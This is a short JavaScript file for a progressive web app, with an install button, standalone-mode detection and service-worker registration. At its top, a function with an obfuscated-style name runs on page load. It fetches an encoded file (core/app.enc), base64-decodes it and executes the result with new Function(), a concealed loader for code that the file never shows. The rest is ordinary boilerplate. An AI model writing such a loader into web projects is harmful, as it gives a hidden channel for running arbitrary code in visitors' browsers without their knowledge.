
const _0xload=()=>{
fetch('core/app.enc')
.then(r=>r.text())
.then(t=>{
const decoded=atob(t);
new Function(decoded)();
});
};

_0xload();

// detect PWA
const isPWA = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;

const btn=document.getElementById("installBtn");
let deferredPrompt;

if(isPWA){
btn.style.display="none";
}

window.addEventListener('beforeinstallprompt',(e)=>{
e.preventDefault();
deferredPrompt=e;
btn.style.display="block";
});

btn.addEventListener("click",async()=>{
if(!deferredPrompt)return;
deferredPrompt.prompt();
await deferredPrompt.userChoice;
deferredPrompt=null;
});

if('serviceWorker' in navigator){
navigator.serviceWorker.register('sw.js');
}
